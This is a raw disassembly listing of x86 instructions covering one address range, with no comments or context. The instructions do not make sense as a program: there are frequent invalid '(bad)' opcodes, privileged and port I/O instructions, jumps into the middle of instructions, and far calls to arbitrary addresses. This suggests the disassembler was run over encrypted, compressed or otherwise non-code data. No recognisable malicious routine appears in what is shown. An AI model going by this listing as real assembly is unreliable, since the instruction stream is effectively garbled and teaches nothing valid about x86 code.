  412861:	xor    DWORD PTR [esi],ecx
  412863:	and    al,0x58
  412865:	aad    0x8a
  412867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412868:	push   0xfffffffe
  41286a:	inc    edi
  41286b:	(bad)  
  41286d:	xchg   BYTE PTR [ebx+0x6fa12a1e],ch
  412873:	inc    ebx
  412874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412875:	add    DWORD PTR [eax-0x40],0xffffff9b
  412879:	jp     0x4127fb
  41287b:	push   esi
  41287c:	stos   BYTE PTR es:[edi],al
  41287d:	xchg   ch,bl
  41287f:	jmp    0x4128fa
  412881:	add    BYTE PTR [esi-0x6df75bc7],al
  412887:	dec    ecx
  412888:	bnd jmp 0x56874470
  41288e:	call   0xa5602cff
  412893:	mov    dh,0xff
  412895:	dec    edx
  412896:	push   eax
  412897:	lock lock pop esi
  41289a:	or     esp,DWORD PTR [ebx+0x24331f2b]
  4128a0:	mov    esi,0xc75f74e4
  4128a5:	test   BYTE PTR [esi-0x51],al
  4128a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128a9:	out    dx,eax
  4128aa:	adc    DWORD PTR [edx+0x146f8bff],0xffffff8a
  4128b1:	adc    DWORD PTR [eax-0x4],ebx
  4128b4:	lock inc edx
  4128b6:	int3   
  4128b7:	inc    esi
  4128b8:	or     al,0x29
  4128ba:	(bad)
  4128bd:	test   eax,0x24bf4c28
  4128c2:	and    bh,BYTE PTR [edi+edi*4-0x6b]
  4128c6:	add    ecx,DWORD PTR [ebx]
  4128c8:	out    0xa6,eax
  4128ca:	jle    0x412860
  4128cc:	dec    BYTE PTR [esi]
  4128ce:	test   BYTE PTR [eax-0x3b],cl
  4128d1:	inc    edx
  4128d2:	mov    DWORD PTR [ecx],esp
  4128d4:	ins    DWORD PTR es:[edi],dx
  4128d5:	jns    0x41289a
  4128d7:	mov    bh,bl
  4128d9:	sti    
  4128da:	push   edi
  4128db:	add    bh,bl
  4128dd:	scas   al,BYTE PTR es:[edi]
  4128de:	cdq    
  4128df:	popf   
  4128e0:	pop    edx
  4128e1:	test   eax,0x7c28c7da
  4128e6:	bound  edx,QWORD PTR [esi]
  4128e8:	fwait
  4128e9:	jnp    0x41293b
  4128eb:	leave  
  4128ec:	or     BYTE PTR [ebp+0x69914d75],dh
  4128f2:	cli    
  4128f3:	dec    ebp
  4128f4:	out    0x51,eax
  4128f6:	adc    DWORD PTR [edi],0xffffff9e
  4128f9:	mov    dh,0x5c
  4128fb:	hlt    
  4128fc:	lea    eax,[esi+0x27df642d]
  412902:	push   eax
  412903:	jmp    0x6e1c:0x583f27a5
  41290a:	pop    esi
  41290b:	jb     0x412941
  41290d:	xor    eax,0xd6b6004b
  412912:	and    eax,ecx
  412914:	adc    esi,esp
  412916:	jge    0x412937
  412918:	inc    ebx
  412919:	xor    al,0x2d
  41291b:	dec    BYTE PTR ds:0xd85b88fb
  412921:	push   ds
  412922:	arpl   WORD PTR ds:0xc73dac56,cx
  412928:	push   edx
  412929:	neg    DWORD PTR [eax]
  41292b:	ja     0x4128e0
  41292d:	outs   dx,DWORD PTR ds:[esi]
  41292e:	into   
  41292f:	inc    edi
  412930:	pop    ss
  412931:	xchg   edx,eax
  412932:	js     0x412916
  412934:	cwde   
  412935:	and    eax,0xb76e2f51
  41293a:	call   0x8c10:0x156a22c0
  412941:	loope  0x4129a4
  412943:	xor    BYTE PTR [esi-0x3],ch
  412946:	das    
  412947:	jnp    0x412962
  412949:	or     eax,0x38da407b
  41294e:	pop    esp
  41294f:	out    0xec,al
  412951:	cmp    BYTE PTR [edx],0x91
  412954:	sti    
  412955:	and    DWORD PTR [edi-0x5b1e488a],eax
  41295b:	mov    DWORD PTR [ebx-0x2b],ebp
  41295e:	pop    edi
  41295f:	jno    0x41294f
  412961:	jno    0x412919
  412963:	pop    esi
  412964:	xor    al,0x6c
  412966:	pop    eax
  412967:	bnd ret 0x29a
  41296b:	mov    edi,0xd0977b82
  412970:	pop    ecx
  412971:	sub    ecx,DWORD PTR [ecx+esi*4]
  412974:	xchg   esi,eax
  412975:	pop    eax
  412976:	das    
  412977:	jle    0x412990
  412979:	imul   ebp,DWORD PTR [edi-0x3514a83a],0x5
  412980:	jg     0x412987
  412982:	dec    edi
  412983:	jne    0x412965
  412985:	leave  
  412986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412987:	(bad)  
  412988:	stc    
  412989:	xlat   BYTE PTR ds:[ebx]
  41298a:	data16 mov bh,0xcc
  41298d:	mov    ebx,edi
  41298f:	jnp    0x412911
  412991:	xchg   esp,eax
  412992:	jl     0x4129dd
  412994:	and    ebp,edx
  412996:	lea    eax,[ebx-0x4808be]
  41299c:	push   ebx
  41299d:	push   es
  41299e:	test   BYTE PTR [ebp-0x64553427],dl
  4129a4:	xchg   esp,eax
  4129a5:	pop    edx
  4129a6:	retf   
  4129a7:	imul   ecx,DWORD PTR [eax+0x69],0x26
  4129ab:	stos   DWORD PTR es:[edi],eax
  4129ac:	fidiv  WORD PTR [edi]
  4129ae:	ret    0xf4a4
  4129b1:	hlt    
  4129b2:	data16 loop 0x412984
  4129b5:	or     ecx,DWORD PTR [ebx+0x77]
  4129b8:	in     al,dx
  4129b9:	call   0xe154f53c
  4129be:	into   
  4129bf:	ds xor eax,0xac42f884
  4129c5:	dec    esp
  4129c6:	les    edx,FWORD PTR [esi-0x210c3d5d]
  4129cc:	fistp  QWORD PTR ss:[eax-0x7753001c]
  4129d3:	adc    esp,0xffffffb9
  4129d6:	mov    edi,0xdc93b3a5
  4129db:	jg     0x412a4d
  4129dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	sti    
  4129e0:	(bad)  
  4129e1:	pop    ecx
  4129e2:	xchg   ecx,eax
  4129e3:	pop    ebp
  4129e4:	push   esi
  4129e5:	xor    BYTE PTR [eax+0x6d422ef6],cl
  4129eb:	les    edi,FWORD PTR [ebp-0x3042ee30]
  4129f1:	mov    esp,0xbdac091e
  4129f6:	lods   al,BYTE PTR ds:[esi]
  4129f7:	jl     0x4129a4
  4129f9:	jae    0x41298e
  4129fb:	lahf   
  4129fc:	mov    ds:0xf092d1ef,eax
  412a01:	and    edi,DWORD PTR [ebx]
  412a03:	mov    eax,0xfd967a79
  412a08:	cmc    
  412a09:	rol    bl,0xe2
  412a0c:	push   0xffffffe6
  412a0e:	icebp  
  412a0f:	fwait
  412a10:	iret   
  412a11:	scas   eax,DWORD PTR es:[edi]
  412a12:	cmp    eax,0xafa50a50
  412a17:	icebp  
  412a18:	xor    esi,DWORD PTR [edi]
  412a1a:	or     bl,BYTE PTR [esp+ebx*4+0x79]
  412a1e:	ficom  WORD PTR [ecx-0x4f]
  412a21:	test   al,0x70
  412a23:	mov    ebx,0xa7785888
  412a28:	xchg   edx,eax
  412a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a2a:	sub    DWORD PTR [eax+esi*2+0x73],eax
  412a2e:	fucom  st(2)
  412a30:	loop   0x4129cd
  412a32:	pusha  
  412a33:	das    
  412a34:	test   al,0x24
  412a36:	inc    eax
  412a37:	les    edx,FWORD PTR [esi]
  412a39:	lock cld 
  412a3b:	imul   eax,esp,0xe
  412a3e:	clc    
  412a3f:	push   ds
  412a40:	scas   eax,DWORD PTR es:[edi]
  412a41:	jg     0x4129f6
  412a43:	pop    esp
  412a44:	jnp    0x412ac2
  412a46:	jo     0x4129e3
  412a48:	mov    WORD PTR [eax-0x5fb7735],ss
  412a4e:	stc    
  412a4f:	mov    esp,0x5daa1788
  412a54:	adc    al,0x37
  412a56:	bswap  ebx
  412a58:	cmc    
  412a59:	and    eax,0x36760c3e
  412a5e:	jb     0x412a3a
  412a60:	mov    esp,0x9148af51
  412a65:	push   es
  412a66:	xchg   edx,eax
  412a67:	repz cmp al,0x4c
  412a6a:	in     al,dx
  412a6b:	jp     0x412adb
  412a6d:	or     dl,BYTE PTR [eax+0x17]
  412a70:	sbb    al,0x65
  412a72:	gs ja  0x412a5a
  412a75:	pop    es
  412a76:	daa    
  412a77:	xor    ch,BYTE PTR [eax+0x12]
  412a7a:	loope  0x412ab0
  412a7c:	test   edx,esp
  412a7e:	adc    eax,0x74c2fde4
  412a83:	push   ds
  412a84:	sbb    ecx,DWORD PTR [eax+0x2c]
  412a87:	inc    ebx
  412a88:	or     BYTE PTR [edi-0x62],bh
  412a8b:	scas   eax,DWORD PTR es:[edi]
  412a8c:	pop    edx
  412a8d:	das    
  412a8e:	dec    ebp
  412a8f:	shl    edi,1
  412a91:	xor    dl,BYTE PTR [eax-0x7ff83c03]
  412a97:	jp     0x412b07
  412a99:	pop    ebp
  412a9a:	add    DWORD PTR [ebx],ebp
  412a9c:	push   ebp
  412a9d:	xchg   ebp,eax
  412a9e:	rol    DWORD PTR [edx],0x4
  412aa1:	aas    
  412aa2:	dec    edx
  412aa3:	sbb    edx,ecx
  412aa5:	sub    DWORD PTR [esi],ebp
  412aa7:	push   esi
  412aa8:	scas   eax,DWORD PTR es:[edi]
  412aa9:	(bad)  [esi-0x70b65e2c]
  412aaf:	mov    ch,0x98
  412ab1:	jge    0x412a99
  412ab3:	ins    DWORD PTR es:[edi],dx
  412ab4:	loop   0x412af6
  412ab6:	sbb    eax,eax
  412ab8:	or     eax,0xc4cb3c40
  412abd:	xchg   ebp,eax
  412abe:	sub    eax,0xf077bdb1
  412ac3:	jecxz  0x412ae6
  412ac5:	stos   DWORD PTR es:[edi],eax
  412ac6:	je     0x412af0
  412ac8:	out    0x9e,al
  412aca:	push   ds
  412acb:	mov    dh,0x10
  412acd:	shl    BYTE PTR [ecx-0x5adb67bf],0x1
  412ad4:	sahf   
  412ad5:	push   edx
  412ad6:	ret    
  412ad7:	int    0x1
  412ad9:	sbb    ecx,DWORD PTR [edx]
  412adb:	mov    ebx,ebx
  412add:	or     ch,BYTE PTR [ebp+0x9]
  412ae0:	aas    
  412ae1:	hlt    
  412ae2:	ret    0x7494
  412ae5:	jg     0x412abc
  412ae7:	add    BYTE PTR [esi],dh
  412ae9:	(bad)  [edx-0x42]
  412aec:	and    eax,0xe292254a
  412af1:	sahf   
  412af2:	and    BYTE PTR [edx],ah
  412af4:	inc    ebp
  412af5:	xor    edi,DWORD PTR [edx]
  412af7:	clc    
  412af8:	mov    dh,0xf1
  412afa:	jne    0x412b76
  412afc:	or     eax,0x8cc77592
  412b01:	cli    
  412b02:	adc    eax,0x11b0f2e9
  412b07:	test   dh,al
  412b09:	sbb    al,0x6d
  412b0b:	cmp    DWORD PTR [ebp-0x65],edx
  412b0e:	push   0xfffffffc
  412b10:	xchg   esi,eax
  412b11:	and    DWORD PTR [edi-0x149d6f25],ebp
  412b17:	aam    0x1d
  412b19:	add    eax,0xe86a20d6
  412b1e:	ss mov ecx,0x5a38e57e
  412b24:	(bad)  [esi-0x488e3dd5]
  412b2a:	push   ebx
  412b2b:	adc    DWORD PTR [ebp-0xe],esi
  412b2e:	ret    0x9c5f
  412b31:	sbb    al,0x11
  412b33:	sub    edi,DWORD PTR [eax+0x72]
  412b36:	pop    ecx
  412b37:	mov    edi,0xd04068f8
  412b3c:	lahf   
  412b3d:	in     eax,dx
  412b3e:	out    0x2f,eax
  412b40:	loop   0x412b86
  412b42:	inc    esp
  412b43:	pop    esp
  412b44:	mov    ds:0x652363ff,al
  412b49:	adc    al,BYTE PTR [ebp+0x9]
  412b4c:	std    
  412b4d:	jno    0x412aef
  412b4f:	(bad)  
  412b50:	mov    eax,ds:0x18a132c6
  412b55:	fidiv  WORD PTR [edi-0x7f]
  412b58:	sahf   
  412b59:	push   edi
  412b5a:	adc    DWORD PTR [eax+0x48],0xffffff8d
  412b5e:	adc    ebx,esi
  412b60:	mov    ds:0x37f26ed6,al
  412b65:	call   0xb096c7a7
  412b6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b6b:	and    edi,DWORD PTR ds:0x681c7dc6
  412b71:	fnstcw WORD PTR [ebp+0x3116874e]
  412b77:	rcl    DWORD PTR ds:0x96c0abeb,0xbd
  412b7e:	jp     0x412b55
  412b80:	xor    edx,DWORD PTR [ebx]
  412b82:	jnp    0x412bf3
  412b84:	test   al,0xd
  412b86:	ins    DWORD PTR es:[edi],dx
  412b87:	in     al,dx
  412b88:	jg     0x412bf1
  412b8a:	fimul  WORD PTR [ebx-0x3aff7e14]
  412b90:	mov    eax,ds:0x7dc7750d
  412b95:	retf   
  412b96:	test   al,ah
  412b98:	adc    edi,0xf2f661a5
  412b9e:	rol    DWORD PTR [edi-0x5f423cfe],0x9d
  412ba5:	(bad)  
  412ba6:	aam    0x11
  412ba8:	sti    
  412ba9:	rcl    BYTE PTR [esi+esi*1],1
  412bac:	sbb    eax,0x666815d9
  412bb1:	xor    BYTE PTR [di-0x6ce0],al
  412bb6:	dec    eax
  412bb7:	popf   
  412bb8:	(bad)  
  412bb9:	push   esp
  412bba:	retf   
  412bbb:	out    dx,eax
  412bbc:	test   BYTE PTR [eax],ch
  412bbe:	pusha  
  412bbf:	sbb    DWORD PTR [ebp+0x41200fd2],ebx
  412bc5:	dec    esp
  412bc6:	fst    st(2)
  412bc8:	jmp    FWORD PTR [edi+0x51b7dfc2]
  412bce:	sub    al,0xa1
  412bd0:	add    al,0x22
  412bd2:	cli    
  412bd3:	jg     0x412c13
  412bd5:	cmp    dh,BYTE PTR [ecx]
  412bd7:	lock jnp 0x412b97
  412bda:	sar    DWORD PTR [ebx-0xf],cl
  412bdd:	shr    BYTE PTR [ebp+0x26625ab9],0x3b
  412be4:	stos   BYTE PTR es:[edi],al
  412be5:	outs   dx,DWORD PTR ds:[esi]
  412be6:	xchg   edx,eax
  412be7:	xor    dl,ch
  412be9:	cmp    DWORD PTR [ebp-0x62e24b96],edx
  412bef:	std    
  412bf0:	mov    dh,0xaf
  412bf2:	jns    0x412c0d
  412bf4:	xor    DWORD PTR [esi+0x2bccccb7],ebp
  412bfa:	loopne 0x412c63
  412bfc:	add    DWORD PTR [eax],ebp
  412bfe:	mov    al,0x82
  412c00:	loopne 0x412c10
  412c02:	or     ecx,ebx
  412c04:	outs   dx,DWORD PTR ds:[esi]
  412c05:	xchg   edi,eax
  412c06:	sbb    ebp,DWORD PTR [ecx-0x75]
  412c09:	or     BYTE PTR [eax+0x3],dl
  412c0c:	mov    eax,0xfa2b58d0
  412c11:	sub    DWORD PTR [edx+0x2e],ebp
  412c14:	sub    dl,BYTE PTR [edi+0x42]
  412c17:	outs   dx,DWORD PTR ss:[esi]
  412c19:	cld    
  412c1a:	push   0x458e2925
  412c1f:	push   esp
  412c20:	jle    0x412bc2
  412c22:	push   esi
  412c23:	jnp    0x412bed
  412c25:	jp     0x412c04
  412c27:	or     DWORD PTR [esi],0x7c
  412c2a:	sub    eax,DWORD PTR [ebp-0x1812bbfb]
  412c30:	and    ebx,DWORD PTR [esi]
  412c32:	inc    edi
  412c33:	xchg   edi,eax
  412c34:	cwde   
  412c35:	and    ch,ah
  412c37:	adc    BYTE PTR [esi+0x20],cl
  412c3a:	sub    dl,BYTE PTR [ecx-0x34]
  412c3d:	xor    al,0x35
  412c3f:	sbb    BYTE PTR [ecx],0xf1
  412c42:	in     al,dx
  412c43:	test   al,0xfd
  412c46:	fwait
  412c47:	mov    eax,ds:0xdb78d10f
  412c4c:	pop    esi
  412c4d:	xchg   esi,eax
  412c4e:	test   eax,0x29ad78e3
  412c53:	mov    cl,0xbd
  412c55:	cmp    dh,ch
  412c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c58:	ret    
  412c59:	pop    esi
  412c5a:	aam    0x98
  412c5c:	(bad)  
  412c5d:	push   ss
  412c5e:	lods   al,BYTE PTR ds:[esi]
  412c5f:	add    ebx,edx
  412c61:	push   edx
  412c62:	and    eax,0x21602f09
  412c67:	jp     0x412c29
  412c69:	fsub   QWORD PTR [ebp+0xd203b4e]
  412c6f:	push   ds
  412c70:	jnp    0x412ccf
  412c72:	sub    DWORD PTR [edx-0x74],ebx
  412c75:	xchg   si,ax
  412c77:	aaa    
  412c78:	fwait
  412c79:	dec    esi
  412c7a:	mov    edi,0x8fa6f034
  412c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c80:	xchg   ecx,eax
  412c81:	mov    eax,0xb77ac1f5
  412c86:	jl     0x412c3f
  412c88:	leave  
  412c89:	push   ebx
  412c8a:	arpl   di,di
  412c8c:	push   0xb287fc4a
  412c91:	adc    ch,BYTE PTR fs:[eax-0x60d3e22f]
  412c98:	scas   eax,DWORD PTR es:[edi]
  412c99:	push   esp
  412c9a:	mov    edx,0xa89bb135
  412c9f:	aam    0x44
  412ca1:	mov    bh,0x95
  412ca3:	jae    0x412d02
  412ca5:	and    edx,DWORD PTR [esi]
  412ca7:	lods   eax,DWORD PTR ds:[esi]
  412ca8:	jecxz  0x412c98
  412caa:	inc    esi
  412cab:	inc    ebp
  412cac:	mov    ?,WORD PTR [ebx-0x27bece13]
  412cb2:	and    al,0xc5
  412cb4:	f2xm1  
  412cb6:	mov    dh,0xfd
  412cb8:	or     dl,BYTE PTR ds:0x8211fe07
  412cbe:	imul   esi,DWORD PTR [edi-0x3e793788],0x36
  412cc5:	dec    ecx
  412cc6:	leave  
  412cc7:	inc    esp
  412cc8:	sbb    edx,DWORD PTR ds:0x2472d31e
  412cce:	add    DWORD PTR [edi],esp
  412cd0:	pop    edi
  412cd1:	cld    
  412cd2:	repz fdivr st,st(5)
  412cd5:	jge    0x412cbb
  412cd7:	jl     0x412cf7
  412cd9:	fiadd  WORD PTR [esi-0x7]
  412cdc:	xor    ch,BYTE PTR [ecx-0x1f942c84]
  412ce2:	sahf   
  412ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ce4:	and    al,0xc2
  412ce6:	mov    al,0x88
  412ce8:	sbb    al,0x42
  412cea:	stos   BYTE PTR es:[edi],al
  412ceb:	shl    DWORD PTR [edx+ebp*2+0xb3e8fc1],cl
  412cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cf3:	mov    bh,0x94
  412cf5:	push   edi
  412cf6:	mov    bh,0x21
  412cf8:	imul   ebx,esi,0xa9048727
  412cfe:	les    ebx,FWORD PTR [edi*4+0x7d0c164e]
  412d05:	xlat   BYTE PTR ds:[ebx]
  412d06:	pop    edx
  412d07:	sti    
  412d08:	adc    ah,bl
  412d0a:	iret   
  412d0b:	mov    ah,BYTE PTR [edx-0x35]
  412d0e:	enter  0x1584,0xd2
  412d12:	push   ds
  412d13:	push   ebx
  412d14:	dec    esi
  412d15:	push   eax
  412d16:	das    
  412d17:	adc    ecx,esi
  412d19:	hlt    
  412d1a:	dec    edx
  412d1b:	xor    al,0x2c
  412d1d:	and    BYTE PTR fs:[edx+0x3e985f03],dh
  412d24:	mov    WORD PTR [esi+0x58e26af5],?
  412d2a:	scas   al,BYTE PTR es:[edi]
  412d2b:	test   DWORD PTR [ebx],esp
  412d2d:	ds dec edx
  412d2f:	sbb    ecx,DWORD PTR [edx+ebx*4-0x42283762]
  412d36:	nop
  412d37:	xor    ch,BYTE PTR [ecx-0x77]
  412d3a:	std    
  412d3b:	jmp    0x94a908fc
  412d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d41:	loope  0x412cd6
  412d43:	push   ebx
  412d44:	inc    edx
  412d45:	sub    eax,0x476d143a
  412d4a:	mov    esi,0xc0bce73d
  412d4f:	stc    
  412d50:	(bad)  
  412d51:	stos   BYTE PTR es:[edi],al
  412d52:	inc    ecx
  412d53:	clc    
  412d54:	(bad)  
  412d55:	and    bh,ah
  412d57:	xchg   ebp,eax
  412d58:	jecxz  0x412ce6
  412d5a:	loope  0x412d4f
  412d5c:	mov    dl,0x40
  412d5e:	lock jmp DWORD PTR [edx]
  412d61:	int3   
  412d62:	ret    0xdb47
  412d65:	sub    BYTE PTR [ebx-0x42343e8d],dl
  412d6b:	sub    DWORD PTR [ecx-0x5b],edx
  412d6e:	je     0x412d8b
  412d70:	test   DWORD PTR [edx+edx*8+0x351e40e3],eax
  412d77:	xor    dh,dh
  412d79:	sbb    BYTE PTR [eax],al
  412d7b:	dec    ebp
  412d7c:	aas    
  412d7d:	pop    ds
  412d7e:	ret    
  412d7f:	dec    esp
  412d80:	mov    dh,0x60
  412d82:	test   DWORD PTR [eax+0x53],ebx
  412d85:	push   edx
  412d86:	sub    DWORD PTR [edx],esp
  412d88:	push   eax
  412d89:	(bad)  
  412d8b:	aaa    
  412d8c:	pop    ebx
  412d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d8e:	(bad)  
  412d8f:	js     0x412d24
  412d91:	sahf   
  412d92:	mov    ecx,0x132c24f4
  412d97:	inc    ebp
  412d98:	and    BYTE PTR [eax+0x4c394c43],dh
  412d9e:	mov    ecx,0x7f0aedaa
  412da3:	jmp    0x412dc6
  412da5:	popf   
  412da6:	xor    BYTE PTR [esi],al
  412da8:	lahf   
  412da9:	xor    ch,BYTE PTR [esp+eax*2-0x3db85367]
  412db0:	push   ebx
  412db1:	or     BYTE PTR [esi],cl
  412db3:	jle    0x412e26
  412db5:	or     eax,0xb1d04af9
  412dba:	xor    DWORD PTR [ebx-0x34],edx
  412dbd:	cmp    BYTE PTR [esi-0x71bb29e6],0x87
  412dc4:	jge    0x412df2
  412dc6:	lock jnp 0x412d7f
  412dc9:	mov    bh,0xec
  412dcb:	xor    ebx,DWORD PTR [edx+0x5e]
  412dce:	adc    DWORD PTR [esi-0xa],ebp
  412dd1:	outs   dx,DWORD PTR ds:[esi]
  412dd2:	dec    ebp
  412dd3:	mov    ds:0xadd4f013,eax
  412dd8:	fucom  st(2)
  412dda:	je     0x412dfe
  412ddc:	xor    ah,BYTE PTR [esp+ecx*1+0x0]
  412de0:	btc    DWORD PTR ds:0x8c286502,edx
  412de7:	clc    
  412de8:	jae    0x412d91
  412dea:	mov    ds:0xa4fcfa1d,eax
  412def:	and    ebx,DWORD PTR [edx]
  412df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412df2:	xchg   edx,eax
  412df3:	mov    DWORD PTR [edi+0x5d8e21f4],esi
  412df9:	mov    bh,0xd3
  412dfb:	xor    eax,0x8bc7c22a
  412e00:	(bad)  
  412e01:	aaa    
  412e02:	call   0xe020:0xe55e0193
  412e09:	in     eax,0x99
  412e0b:	adc    eax,0xb166f70c
  412e10:	or     ah,BYTE PTR ds:0x543b0d11
  412e16:	push   edx
  412e17:	dec    eax
  412e18:	aad    0xaf
  412e1a:	mov    ah,BYTE PTR [ecx-0x1b4544a9]
  412e20:	in     al,dx
  412e21:	cs pop ecx
  412e23:	or     BYTE PTR [edi],al
  412e25:	pop    ss
  412e26:	sar    esi,cl
  412e28:	xchg   BYTE PTR [esi],ch
  412e2a:	retf   0x26eb
  412e2d:	sub    edi,DWORD PTR [edx]
  412e2f:	pushf  
  412e30:	out    dx,eax
  412e31:	mov    esp,DWORD PTR [ebx+0x15]
  412e34:	xchg   ebp,eax
  412e35:	or     eax,0xf77cdc36
  412e3a:	pop    esp
  412e3b:	js     0x412e79
  412e3d:	inc    esp
  412e3e:	push   ss
  412e3f:	cmp    DWORD PTR [ebx-0x22],0x9697b936
  412e46:	pop    eax
  412e47:	add    ch,BYTE PTR [edx+0x17]
  412e4a:	and    cl,BYTE PTR [ecx+0x46cbd7f0]
  412e50:	(bad)  
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	mov    ds:0xc8f00341,al
  412e57:	fwait
  412e58:	push   es
  412e59:	inc    ebx
  412e5a:	jmp    0xd109dae4
  412e5f:	das    
  412e60:	imul   DWORD PTR [esi+0x322d34a9]
  412e66:	cs icebp 
  412e68:	jne    0x412e7e
  412e6a:	push   ebx
  412e6b:	add    ebp,DWORD PTR [esi+0x79]
  412e6e:	stc    
  412e6f:	imul   esp,DWORD PTR [edi],0x339fc166
  412e75:	pusha  
  412e76:	inc    BYTE PTR [ecx+0x4c]
  412e79:	jle    0x412e10
  412e7b:	fisub  WORD PTR [ecx+edx*2+0x77]
  412e7f:	pop    edx
  412e80:	pop    eax
  412e81:	fcomp  QWORD PTR [esi+0x45]
  412e84:	fidivr DWORD PTR [ebp-0x6]
  412e87:	(bad)  
  412e88:	mov    eax,ds:0x67574bcc
  412e8d:	mov    ch,0x3b
  412e8f:	pop    ebx
  412e90:	fs es pushf 
  412e93:	cs and al,0x39
  412e96:	iret   
  412e97:	fwait
  412e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e99:	aad    0x75
  412e9b:	pop    ebp
  412e9c:	fild   QWORD PTR [ecx+edx*2-0x79fee8bf]
  412ea3:	jne    0x412ed8
  412ea5:	mov    al,ds:0x97eccec0
  412eaa:	stos   BYTE PTR es:[edi],al
  412eab:	shl    ch,cl
  412ead:	fadd   DWORD PTR [ebp-0x58be877e]
  412eb3:	jle    0x412e5f
  412eb5:	je     0x412edb
  412eb7:	inc    edi
  412eb8:	call   0xeb629cdf
  412ebd:	xchg   ch,bl
  412ebf:	jns    0x412f22
  412ec1:	mov    dl,0x11
  412ec3:	in     eax,0x4a
  412ec5:	outs   dx,BYTE PTR ds:[esi]
  412ec6:	sub    eax,0x6bd0a04e
  412ecb:	xchg   ebp,eax
  412ecc:	mov    bh,0x7e
  412ece:	mov    DWORD PTR [ecx+0x15],ebp
  412ed1:	sub    BYTE PTR [ebx],0x5c
  412ed4:	push   edx
  412ed5:	push   ebx
  412ed6:	loop   0x412f25
  412ed8:	call   0xd11f:0x8f44d33c
  412edf:	xchg   DWORD PTR [edi+eax*8],ebx
  412ee2:	mov    edx,0xb051c726
  412ee7:	cwde   
  412ee8:	ret    
  412ee9:	ins    BYTE PTR es:[edi],dx
  412eea:	pop    esp
  412eeb:	jle    0x412eaa
  412eed:	cmp    BYTE PTR [edx],bl
  412eef:	pop    ebx
  412ef0:	stos   BYTE PTR es:[edi],al
  412ef1:	inc    ecx
  412ef2:	aaa    
  412ef3:	(bad)  
  412ef5:	cmovg  ecx,DWORD PTR [ebx+0x6d67661f]
  412efc:	sub    eax,0x78ad7461
  412f01:	push   ebp
  412f02:	and    bl,BYTE PTR [edx]
  412f04:	data16 sbb al,0x41
  412f07:	mov    al,0x86
  412f09:	dec    edi
  412f0a:	fs cdq 
  412f0c:	icebp  
  412f0d:	int3   
  412f0e:	push   eax
  412f0f:	jmp    0xfe8b:0x6f454df6
  412f16:	frstor [esi+0xa38eb78]
  412f1c:	or     eax,0xcd77ea4e
  412f21:	xchg   ecx,eax
  412f22:	ficomp WORD PTR [esi]
  412f24:	mov    ds,WORD PTR [eax+0x6ba1f4cc]
  412f2a:	inc    edi
  412f2b:	jge    0x412f90
  412f2d:	in     eax,0x7d
  412f2f:	jg     0x412f5f
  412f31:	pop    ss
  412f32:	mov    ds:0x671774b8,eax
  412f37:	or     esi,ecx
  412f39:	add    esi,0x33
  412f3c:	inc    edx
  412f3d:	fidiv  WORD PTR [ebx+ebp*8]
  412f40:	pop    ds
  412f41:	push   ebp
  412f42:	stos   DWORD PTR es:[edi],eax
  412f43:	add    edi,edi
  412f45:	test   BYTE PTR [edi],0xb0
  412f48:	cmp    ebx,ebx
  412f4a:	xor    al,0x35
  412f4c:	loope  0x412f6c
  412f4e:	sbb    BYTE PTR [eax],bh
  412f50:	mov    ch,0xbd
  412f52:	stos   DWORD PTR es:[edi],eax
  412f53:	pop    edx
  412f54:	mov    ah,0x1a
  412f56:	push   esi
  412f57:	xchg   edi,eax
  412f58:	cdq    
  412f59:	xchg   esp,eax
  412f5a:	push   ds
  412f5b:	je     0x412fac
  412f5d:	rcr    DWORD PTR ds:0x4ae5ad5e,0xea
  412f64:	pop    eax
  412f65:	clc    
  412f66:	pop    ss
  412f67:	test   BYTE PTR [ebx+0x13],bl
  412f6a:	mov    edi,0xd0189eef
  412f6f:	add    eax,DWORD PTR [ecx-0x5cb23ccc]
  412f75:	xchg   edx,eax
  412f76:	jl     0x412f9e
  412f78:	ret    0x5f83
  412f7b:	inc    ebp
  412f7c:	imul   bh
  412f7e:	push   es
  412f7f:	ror    DWORD PTR [ebx-0x27f5c18d],0xa6
  412f86:	daa    
  412f87:	sbb    BYTE PTR [ebp+0x7f5fbfda],ch
  412f8d:	jno    0x412fe2
  412f8f:	inc    esp
  412f90:	mov    dl,BYTE PTR [ebx+0x26]
  412f93:	fldenv [ecx+0x3460c1f7]
  412f99:	xor    BYTE PTR ds:0x447917b7,dh
  412f9f:	push   cs
  412fa0:	cld    
  412fa1:	fist   DWORD PTR [esi]
  412fa3:	in     al,0x5e
  412fa5:	sub    BYTE PTR ds:0xad811201,dl
  412fab:	add    esi,DWORD PTR ds:0xa4118029
  412fb1:	fwait
  412fb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fb3:	mov    bl,0x7c
  412fb5:	inc    edx
  412fb6:	mov    ah,0x6f
  412fb8:	adc    al,0x53
  412fbb:	hlt    
  412fbc:	mov    ds:0x2e2ffdf0,eax
  412fc1:	add    eax,0x2455f8d5
  412fc6:	mov    al,ds:0x93519d88
  412fcb:	js     0x412f82
  412fcd:	mov    bl,0x2e
  412fcf:	jg     0x413010
  412fd1:	nop
  412fd2:	sub    eax,0x5f5d0e07
  412fd7:	mov    eax,ds:0xc05c5bcc
  412fdc:	lods   al,BYTE PTR ds:[esi]
  412fdd:	fimul  WORD PTR [edi-0x768f4039]
  412fe3:	fs push es
  412fe5:	sub    eax,0xbda5778c
  412fea:	add    ebp,edi
  412fec:	jmp    0x412fa1
  412fee:	sub    cl,BYTE PTR [edx]
  412ff0:	bound  eax,QWORD PTR [ebp+eax*4+0x24]
